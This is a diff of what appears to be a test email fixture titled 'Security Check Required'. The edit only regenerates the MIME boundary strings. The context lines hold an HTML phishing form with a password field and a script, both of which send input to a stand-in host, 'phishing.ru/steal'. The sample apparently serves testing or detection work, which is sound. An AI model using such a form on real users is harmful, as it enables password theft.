@@ -4,15 +4,15 @@ Subject: Security Check Required
 Date: Tue, 08 Sep 2026 10:00:00 +0000
 MIME-Version: 1.0
 Content-Type: multipart/alternative;
- boundary="===============2567634075267838465=="
+ boundary="===============2104954406756192179=="
 
---===============2567634075267838465==
+--===============2104954406756192179==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: 7bit
 
 Please complete the security check.
 
---===============2567634075267838465==
+--===============2104954406756192179==
 Content-Type: text/html; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 MIME-Version: 1.0
@@ -21,4 +21,4 @@ MIME-Version: 1.0
 ion=3D'http://phishing.ru/steal'"><input name=3D"password" type=3D"password">=
 </form><script>this.action=3D'http://phishing.ru/steal'</script>
 
---===============2567634075267838465==--
+--===============2104954406756192179==--
